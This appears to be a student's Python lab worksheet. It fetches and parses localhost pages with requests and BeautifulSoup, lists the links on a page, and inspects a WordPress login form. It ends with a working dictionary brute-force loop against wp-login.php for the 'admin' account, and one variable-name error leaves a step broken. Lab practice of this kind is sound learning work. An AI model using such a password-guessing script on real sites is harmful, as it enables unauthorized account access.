import requests
requests.get("http://127.0.0.1") 

req_ = requests.get("http://127.0.0.1") 
req_.headers

# for Task 4

req_.content 
req_.text 

#moving on to 5

from bs4 import BeautifulSoup 
soup = BeautifulSoup(req_.text, 'html.parser') 
print(soup.prettify()) 

#Task 6: 

print(soup.title)  

#Task 8 

home_ = requests.get("http://localhost")
soup = BeautifulSoup(homepage.content, 'html.parser') 

imgs = soup.find_all('a',href=True) 
imgs_href = [] 

for img in imgs:
    imgs_href.append(img['href'])   

imgs_set = set(imgs_href) 
    
for img in imgs_set:
    print(img)

#Task 9

word_p = requests.get('http://localhost/wp-admin/')
soup_word_p = BeautifulSoup(word_p.text, 'html.parser')

print(soup_word_p.prettify()) 

#Task 10: 

<form action="/wp-login.php" id="loginform" method="post" name="loginform"> 

<input class="input" id="user_login" name="log" size="20" type="text" value=""/>
<input class="input" id="user_pass" name="pwd" size="20" type="password" value=""/>

#first we instantiate a variable for our password file 

passfile = 'password_dictionary.txt' 

with open(passfile, 'r') as f: 
    for word in f: 
        word=word.strip('\n') 
        trying_ = requests.post('http://localhost/wp-login.php', data={"log":"admin", "pwd":word})

        if "ERROR" not in trying_.text:          
            print('Success, the password is: '+word) 
            break 
        else: 
            print('Incorrect password: '+word)


